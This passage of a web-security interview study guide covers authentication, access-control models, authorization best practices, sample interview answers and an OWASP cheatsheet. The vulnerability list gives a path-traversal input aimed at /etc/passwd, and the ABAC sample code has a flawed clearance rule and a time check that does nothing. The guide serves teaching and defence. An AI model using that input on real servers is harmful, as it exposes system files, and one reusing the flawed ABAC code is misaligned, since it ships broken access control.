"When a user creates a password, we hash it using bcrypt which automatically adds a random salt and uses a slow, computationally expensive algorithm. The hash is stored in the database. When they login, we hash the entered password and compare it with the stored hash. Even if our database is breached, attackers can't reverse the hashes to get passwords. The slow algorithm means brute force attacks take too long to be practical."

**"Session vs JWT authentication - which is better?"**:
"Neither is universally better - it depends on your use case. Sessions are better for traditional web apps where you need immediate revocation (logout) and server-side state management. JWTs are better for distributed systems, microservices, and mobile APIs where you want stateless authentication. However, JWTs can't be easily invalidated before expiry, so use short expiration times and refresh tokens. In practice, many systems use a hybrid approach."

**"Why is MFA important?"**:
"Even with strong password policies, passwords can be compromised through phishing, keyloggers, or data breaches. MFA adds a second factor that attackers are much less likely to have access to. Even if they steal your password, they can't login without your phone or hardware token. It's the single most effective security measure for preventing account takeover."

**"What's the difference between OAuth and OpenID Connect?"**:
"OAuth 2.0 is an authorization framework for delegating access - like giving a valet key that can only unlock your car but can't open the trunk. OpenID Connect adds an identity layer on top, providing authentication - it proves who you are, not just what you can access. When you 'Sign in with Google', you're using OpenID Connect for authentication, built on OAuth 2.0 for authorization."

---

## Authorization & Access Control

### What is Authorization?

**Authorization** determines what an authenticated user is allowed to do. It's about permissions and access rights.

**After Authentication**: "I know who you are"
**Authorization**: "Are you allowed to do that?"

### Access Control Models

### 1. Role-Based Access Control (RBAC)

**Concept**: Users are assigned roles, roles have permissions.

**Structure**:
```
User → Role → Permissions
John → Admin → (Create Users, Delete Users, View Reports)
Jane → Editor → (Edit Content, Publish Content)
Bob → Viewer → (View Content)
```

**Implementation**:
```javascript
// Database schema
const UserSchema = new Schema({
  username: String,
  password: String,
  roles: [{ type: String, enum: ['admin', 'editor', 'viewer'] }]
});

const rolePermissions = {
  admin: ['users:create', 'users:delete', 'users:edit', 'posts:*'],
  editor: ['posts:create', 'posts:edit', 'posts:publish'],
  viewer: ['posts:read']
};

// Authorization middleware
function authorize(permission) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).send('Not authenticated');
    }
    
    const userPermissions = req.user.roles.flatMap(role => rolePermissions[role] || []);
    
    // Check if user has permission
    const hasPermission = userPermissions.some(p => {
      // Wildcard support: posts:* matches posts:create, posts:edit, etc.
      return p === permission || 
             p.endsWith(':*') && permission.startsWith(p.slice(0, -1));
    });
    
    if (!hasPermission) {
      return res.status(403).send('Forbidden');
    }
    
    next();
  };
}

// Usage
app.post('/users', authorize('users:create'), (req, res) => {
  // Create user
});

app.delete('/users/:id', authorize('users:delete'), (req, res) => {
  // Delete user
});

app.get('/posts', authorize('posts:read'), (req, res) => {
  // View posts
});
```

**Advantages**:
- Simple to understand and implement
- Easy to manage (assign roles to users)
- Works well for most applications

**Disadvantages**:
- Can lead to role explosion (too many specific roles)
- Hard to handle exceptions (this user needs one extra permission)
- Doesn't handle resource-specific permissions well

---

### 2. Attribute-Based Access Control (ABAC)

**Concept**: Access decisions based on attributes of user, resource, action, and environment.

**Structure**:
```
Decision based on:
- User attributes: role, department, security clearance
- Resource attributes: owner, classification, department
- Action: read, write, delete
- Environment: time, location, IP address
```

**Example Rules**:
```
Allow if:
  user.department == resource.department AND
  user.securityClearance >= resource.classification AND
  action == 'read' AND
  environment.time is business_hours

Allow if:
  user.id == resource.owner AND
  action in ['read', 'edit', 'delete']

Deny if:
  environment.location == 'outside_country'
```

**Implementation**:
```javascript
class AccessControl {
  static canAccess(user, resource, action, environment) {
    // Rule 1: Owner can do anything
    if (user.id === resource.ownerId) {
      return true;
    }
    
    // Rule 2: Same department can read
    if (user.department === resource.department && action === 'read') {
      return true;
    }
    
    // Rule 3: Security clearance
    if (user.securityClearance >= resource.classification) {
      return true;
    }
    
    // Rule 4: Time-based (business hours only)
    const hour = environment.currentTime.getHours();
    if (hour < 9 || hour > 17) {
      return false;
    }
    
    return false;
  }
}

// Usage
app.get('/documents/:id', async (req, res) => {
  const document = await Document.findById(req.params.id);
  
  const canAccess = AccessControl.canAccess(
    req.user,
    document,
    'read',
    { currentTime: new Date(), ip: req.ip }
  );
  
  if (!canAccess) {
    return res.status(403).send('Access denied');
  }
  
  res.json(document);
});
```

**Advantages**:
- Very flexible
- Handles complex scenarios
- Fine-grained control

**Disadvantages**:
- Complex to implement and maintain
- Performance overhead (evaluating rules)
- Difficult to debug and audit

---

### 3. Relationship-Based Access Control (ReBAC)

**Concept**: Access based on relationships between users and resources.

**Examples**:
```
- User can view posts from friends
- User can edit documents they created or are collaborators on
- User can see profiles of connections within 2 degrees
- Manager can see reports of direct and indirect reports
```

**Implementation**:
```javascript
// Database with relationships
const DocumentSchema = new Schema({
  title: String,
  content: String,
  owner: { type: ObjectId, ref: 'User' },
  collaborators: [{ type: ObjectId, ref: 'User' }],
  viewers: [{ type: ObjectId, ref: 'User' }]
});

// Authorization check
async function canAccessDocument(userId, documentId, action) {
  const doc = await Document.findById(documentId)
    .populate('owner')
    .populate('collaborators')
    .populate('viewers');
  
  // Owner can do anything
  if (doc.owner._id.equals(userId)) {
    return true;
  }
  
  // Collaborators can read and edit
  if (action === 'read' || action === 'edit') {
    if (doc.collaborators.some(c => c._id.equals(userId))) {
      return true;
    }
  }
  
  // Viewers can read
  if (action === 'read') {
    if (doc.viewers.some(v => v._id.equals(userId))) {
      return true;
    }
  }
  
  return false;
}

// Social network example
async function canViewProfile(viewerId, profileId) {
  // Can view own profile
  if (viewerId === profileId) return true;
  
  // Check if friends
  const friendship = await Friendship.findOne({
    $or: [
      { user1: viewerId, user2: profileId },
      { user1: profileId, user2: viewerId }
    ],
    status: 'accepted'
  });
  
  if (friendship) return true;
  
  // Check if friend of friend (2 degrees)
  const mutualFriends = await User.aggregate([
    { $match: { _id: viewerId } },
    { $lookup: { from: 'friendships', localField: '_id', foreignField: 'user1', as: 'friends1' } },
    { $lookup: { from: 'friendships', localField: '_id', foreignField: 'user2', as: 'friends2' } },
    // Complex aggregation to find 2-degree connections
  ]);
  
  return mutualFriends.length > 0;
}
```

---

### Authorization Best Practices

### 1. Principle of Least Privilege

**Concept**: Users should have only the minimum access necessary to perform their job.

```javascript
// ❌ Bad - too broad
user.roles = ['admin']; // Full system access

// ✅ Good - specific
user.roles = ['content_editor']; // Only edit content
user.permissions = ['posts:create', 'posts:edit:own'];
```

### 2. Defense in Depth

**Multiple layers of authorization**:
```javascript
// Layer 1: Route-level
app.delete('/users/:id', authenticate, authorize('users:delete'), async (req, res) => {
  
  // Layer 2: Business logic
  const user = await User.findById(req.params.id);
  if (user.role === 'super_admin') {
    return res.status(403).send('Cannot delete super admin');
  }
  
  // Layer 3: Database-level (using MongoDB pre-remove hook)
  await user.remove();
});

UserSchema.pre('remove', function(next) {
  if (this.role === 'super_admin') {
    throw new Error('Cannot delete super admin');
  }
  next();
});
```

### 3. Resource-Level Authorization

**Always verify user can access specific resource**:
```javascript
// ❌ Bad - only checks if user can edit posts in general
app.put('/posts/:id', authorize('posts:edit'), async (req, res) => {
  await Post.findByIdAndUpdate(req.params.id, req.body);
  res.send('Updated');
});

// ✅ Good - checks if user owns this specific post
app.put('/posts/:id', authorize('posts:edit'), async (req, res) => {
  const post = await Post.findById(req.params.id);
  
  // Verify ownership
  if (!post.author.equals(req.user.id) && !req.user.roles.includes('admin')) {
    return res.status(403).send('Can only edit your own posts');
  }
  
  await post.update(req.body);
  res.send('Updated');
});
```

### 4. Secure Direct Object References

**Prevent IDOR (Insecure Direct Object Reference)**:
```javascript
// ❌ Vulnerable - no authorization check
app.get('/invoice/:id', async (req, res) => {
  const invoice = await Invoice.findById(req.params.id);
  res.json(invoice);
});
// Attacker can access any invoice by guessing IDs

// ✅ Secure - verify ownership
app.get('/invoice/:id', async (req, res) => {
  const invoice = await Invoice.findOne({
    _id: req.params.id,
    userId: req.user.id  // Must belong to logged-in user
  });
  
  if (!invoice) {
    return res.status(404).send('Invoice not found');
  }
  
  res.json(invoice);
});

// ✅ Alternative - use UUIDs instead of sequential IDs
const InvoiceSchema = new Schema({
  _id: { type: String, default: () => uuidv4() },
  // Makes guessing IDs impractical
});
```

### 5. API Authorization Patterns

**GraphQL Authorization**:
```javascript
// Field-level authorization
const typeDefs = gql`
  type User {
    id: ID!
    username: String!
    email: String!      # Only visible to self and admins
    password: String!   # Never exposed
  }
`;

const resolvers = {
  User: {
    email: (parent, args, context) => {
      // Only return email to owner or admin
      if (context.user.id === parent.id || context.user.isAdmin) {
        return parent.email;
      }
      return null;
    },
    password: () => {
      // Never expose password
      throw new Error('Password field not accessible');
    }
  }
};

// Query-level authorization
const resolvers = {
  Query: {
    users: (parent, args, context) => {
      if (!context.user.isAdmin) {
        throw new Error('Admin access required');
      }
      return User.find();
    },
    me: (parent, args, context) => {
      return User.findById(context.user.id);
    }
  }
};
```

**REST API Authorization Headers**:
```javascript
// Check authorization header
const auth = req.headers.authorization;
if (!auth || !auth.startsWith('Bearer ')) {
  return res.status(401).send('Missing or invalid token');
}

const token = auth.split(' ')[1];
// Verify token...
```

### 6. Frontend Authorization

**Important: Frontend authorization is for UX only, NOT security**
```javascript
// React example
const ProtectedRoute = ({ component: Component, permission, ...rest }) => {
  const user = useUser();
  
  return (
    <Route
      {...rest}
      render={props =>
        user && hasPermission(user, permission) ? (
          <Component {...props} />
        ) : (
          <Redirect to="/unauthorized" />
        )
      }
    />
  );
};

// Conditional rendering
const AdminPanel = () => {
  const user = useUser();
  
  return (
    <div>
      <h1>Dashboard</h1>
      
      {/* Show delete button only to admins */}
      {hasPermission(user, 'users:delete') && (
        <button onClick={deleteUser}>Delete User</button>
      )}
    </div>
  );
};

// ⚠️ Important: This is UI convenience only!
// Always enforce authorization on the server
// Attackers can bypass frontend checks easily
```

### Authorization Libraries

**Node.js**:
```javascript
// Using casl (CASL - isomorphic authorization)
const { defineAbility } = require('@casl/ability');

const ability = defineAbility((can, cannot) => {
  // Define rules
  can('read', 'Post');
  can('create', 'Post', { authorId: user.id });
  can('update', 'Post', { authorId: user.id });
  can('delete', 'Post', { authorId: user.id });
  
  if (user.isAdmin) {
    can('manage', 'all'); // Can do everything
  }
  
  cannot('delete', 'Post', { published: true }); // Override
});

// Check permissions
if (ability.can('update', post)) {
  // Allow update
}

// Using accesscontrol
const AccessControl = require('accesscontrol');
const ac = new AccessControl();

ac.grant('user')
  .createOwn('post')
  .readAny('post')
  .updateOwn('post')
  .deleteOwn('post');

ac.grant('admin')
  .extend('user')
  .createAny('post')
  .updateAny('post')
  .deleteAny('post');

// Check
const permission = ac.can('user').updateOwn('post');
if (permission.granted) {
  // Allow
}
```

### Common Authorization Vulnerabilities

**1. Insecure Direct Object Reference (IDOR)**:
```
Problem: /api/users/123 returns any user's data
Fix: Verify req.user.id matches 123 or user is admin
```

**2. Missing Function Level Access Control**:
```
Problem: Admin API endpoints accessible to regular users
Fix: Add authorization middleware to all admin routes
```

**3. Privilege Escalation**:
```
Problem: User can change their role via API
Fix: Only admins can modify roles; validate on server
```

**4. Path Traversal**:
```
Problem: /api/files?path=../../../etc/passwd
Fix: Validate and sanitize file paths; use allowlist
```

### Interview Talking Points

**"Explain RBAC vs ABAC"**:
"RBAC assigns users to roles and roles have fixed permissions. It's simple and works well when you have distinct job functions. ABAC makes decisions based on attributes of the user, resource, and context. It's more flexible for complex scenarios. For example, with RBAC you might have 'Editor' role with edit permission. With ABAC, you could say 'allow edit if user.department equals resource.department AND time is business hours'. RBAC is easier to implement and maintain, but ABAC handles exceptions and complex rules better."

**"What's the difference between authentication and authorization?"**:
"Authentication is proving who you are - like showing your driver's license. Authorization is determining what you're allowed to do - like checking if your license allows you to drive a commercial vehicle. You always do authentication first, then authorization. A user might be successfully authenticated but still not authorized to access a particular resource."

**"How do you handle authorization in microservices?"**:
"Each microservice should validate authorization independently, but you want to avoid duplicating complex logic. Common approaches: 1) Include user roles/permissions in JWT tokens (but keep tokens small), 2) Use a shared authorization service that all microservices call, 3) Implement an API gateway that handles authorization before routing requests. The key is ensuring every service validates, not trusting that upstream services did it."

**"What is privilege escalation and how do you prevent it?"**:
"Privilege escalation is when a user gains higher permissions than they should have. Horizontal escalation is accessing another user's data at your level (like viewing another user's email). Vertical escalation is gaining higher roles (regular user becoming admin). Prevention: Always verify authorization on the server, validate user owns resources they're accessing, protect role/permission changes with extra authentication, use immutable audit logs, implement least privilege principle."

---

## Interview Questions & Answers

### General Security Questions

**Q: What's the most important security principle?**
A: "Defense in depth - never rely on a single security measure. Use multiple layers: input validation, output encoding, authentication, authorization, encryption, logging, rate limiting, etc. If one layer fails, others should still protect the system."

**Q: How do you stay updated on security best practices?**
A: "I regularly review OWASP documentation, follow security researchers on Twitter, read security blogs like Krebs on Security, participate in CTFs (Capture The Flag competitions) to practice, and always review security sections of release notes for frameworks I use. I also run security tools like npm audit, Snyk, or OWASP ZAP on projects regularly."

**Q: Client-side validation vs server-side validation?**
A: "Always do both, but for different reasons. Client-side validation provides immediate feedback for better UX - no need to wait for server round-trip. But it's NOT security - users can bypass it easily through browser DevTools or API requests. Server-side validation is mandatory for security - it's your last line of defense. Never trust anything from the client."

**Q: What security headers should every website have?**
A:
```
1. Content-Security-Policy - Prevents XSS
2. X-Frame-Options or frame-ancestors - Prevents clickjacking
3. X-Content-Type-Options: nosniff - Prevents MIME sniffing
4. Strict-Transport-Security (HSTS) - Forces HTTPS
5. X-XSS-Protection - Legacy XSS protection
6. Referrer-Policy - Controls referrer information
7. Permissions-Policy - Controls browser features

In Express.js with Helmet:
app.use(helmet());
```

**Q: What's the difference between encoding, encryption, and hashing?**
A:
```
Encoding: Transforms data for transport/storage (Base64, URL encoding)
- Reversible without key
- NOT for security
- Example: Base64 encode "Hello" → "SGVsbG8="

Encryption: Transforms data for confidentiality
- Reversible WITH key
- For protecting data
- Example: AES encrypt with key → decrypt with same key

Hashing: One-way transformation
- NOT reversible
- For integrity and password storage
- Example: SHA-256("password") → always same output, can't reverse
```

**Q: How would you secure a React application?**
A:
```
1. Use HTTPS everywhere
2. Implement proper authentication (OAuth/JWT)
3. Never store sensitive data in localStorage (XSS risk)
4. Use HttpOnly cookies for tokens
5. Implement CSP headers
6. Sanitize user input (use DOMPurify for HTML)
7. Keep dependencies updated (npm audit)
8. Validate all API responses
9. Implement rate limiting on backend
10. Use environment variables for secrets, never commit them
11. Enable source map protection in production
12. Implement proper authorization checks on backend
```

### Scenario-Based Questions

**Q: A user reports their account was accessed from a different country. How do you investigate?**
A:
```
1. Check authentication logs: When, where (IP), what device
2. Review recent account activity: Changes made, data accessed
3. Check for multiple concurrent sessions
4. Verify if MFA was used or bypassed
5. Look for suspicious failed login attempts before success
6. Check if password was changed recently
7. Review other accounts for similar patterns (potential breach)

Immediate actions:
1. Force logout all sessions
2. Require password reset
3. Enable/require MFA
4. Send security alert to user
5. Temporarily block access from suspicious IPs
6. Review and revoke any API tokens

Prevention:
- Implement anomaly detection (unusual location, device)
- Require MFA for sensitive operations
- Send email notifications for logins from new devices/locations
```

**Q: You discover a SQL injection vulnerability in production. What do you do?**
A:
```
Immediate (within hours):
1. Assess scope: Which endpoints are vulnerable?
2. Check logs: Has it been exploited?
3. If actively exploited: Add WAF rule to block attack pattern
4. Deploy fix: Use parameterized queries
5. Notify security team and management

Short-term (days):
1. Full security audit of database queries
2. Review logs for suspicious activity
3. Check database for unauthorized changes
4. If data breach occurred: Notify affected users, authorities (GDPR)
5. Rotate database credentials
6. Implement database activity monitoring

Long-term (weeks):
1. Add SQL injection testing to CI/CD pipeline
2. Code review guidelines to catch this
3. Developer training on secure coding
4. Implement input validation framework
5. Regular penetration testing
6. Bug bounty program
```

**Q: How would you implement a "Remember Me" feature securely?**
A:
```javascript
// ❌ Insecure approaches:
// 1. Store password in cookie - NEVER
// 2. Long-lived session - risky if stolen
// 3. Store JWT in localStorage - XSS vulnerable

// ✅ Secure approach:
// Use refresh token with following properties:

1. Generate crypto-random token
const rememberToken = crypto.randomBytes(32).toString('hex');

2. Store hashed token in database with:
   - userId
   - hashedToken
   - expiresAt (30 days)
   - createdAt
   - deviceInfo (optional)
   - lastUsedAt (optional)

3. Set as HttpOnly, Secure, SameSite cookie
res.cookie('rememberMe', rememberToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
});

4. On subsequent visits:
   - Validate token exists in database
   - Check expiration
   - Optionally: Check device fingerprint
   - Generate new short-lived session
   - Optionally: Rotate remember token

5. User can revoke:
   - Logout from all devices → delete all tokens
   - View active sessions → delete specific tokens

6. Additional security:
   - Rate limit token usage
   - Log token usage for monitoring
   - Invalidate token after password change
   - Consider step-up auth for sensitive operations
```

**Q: Users are complaining about too many authentication prompts. How do you balance security and UX?**
A:
```
Solutions:

1. Session Management:
   - Longer session timeout (but with idle timeout)
   - Remember device (lower friction for trusted devices)
   - SSO across related applications

2. Risk-Based Authentication:
   - Known device + location: No MFA
   - New device: Require MFA
   - Unusual activity: Require re-authentication
   - High-risk action: Step-up authentication

3. Implement properly:
   - Session extension on activity (sliding window)
   - Remember device with device fingerprinting
   - Trusted device management UI
   - Clear security notifications

4. MFA Improvements:
   - Biometric authentication (FaceID, TouchID)
   - Hardware keys (WebAuthn)
   - Push notifications instead of codes
   - Backup codes for accessibility

5. Step-Up Authentication:
   - Reading posts: No extra auth
   - Posting content: Maybe verify once per session
   - Changing email: Require password
   - Deleting account: Require password + MFA

Key: Friction should match risk level
```

---

## Quick Reference Cheatsheet

### OWASP Top 10 (2021)
1. **Broken Access Control** - Verify authorization everywhere
2. **Cryptographic Failures** - Use HTTPS, encrypt sensitive data, bcrypt passwords
3. **Injection** - Use parameterized queries, validate input
4. **Insecure Design** - Threat modeling, secure by default
5. **Security Misconfiguration** - Secure defaults, remove samples, error handling
6. **Vulnerable Components** - Keep updated, npm audit, dependency scanning
7. **Auth Failures** - MFA, strong passwords, secure sessions
8. **Software Integrity** - Verify signatures, SRI, secure CI/CD
9. **Logging Failures** - Log security events, centralize logs, monitor
10. **SSRF** - Validate URLs, whitelist domains, block private IPs

### XSS Prevention
- React escapes by default (use it!)
- DOMPurify for HTML sanitization
- CSP headers
- HttpOnly cookies
- Avoid dangerouslySetInnerHTML
- Validate and sanitize input

### CSRF Prevention
- CSRF tokens in forms
- SameSite cookies (Lax/Strict)
- Verify Origin/Referer headers
- Custom headers for AJAX
- Re-authentication for sensitive actions

### CORS Essentials
- Access-Control-Allow-Origin (specific, not *)
- Access-Control-Allow-Credentials (careful!)
- Preflight for complex requests
- CORS ≠ CSRF protection

### Authentication Best Practices
- Bcrypt passwords (work factor 10+)
- MFA for sensitive accounts
- Rate limiting on login
- Account lockout after failed attempts
- Secure password reset flow
- Audit logging

### Authorization Best Practices
- Principle of least privilege
- Verify resource ownership
- Defense in depth
- RBAC for simple, ABAC for complex
- Frontend auth is UX, not security

---

This guide covers the key security concepts you need for interviews. The emphasis is on understanding WHY things work, not just HOW to implement them. Being able to explain the reasoning behind security decisions shows deeper knowledge than just memorizing code patterns.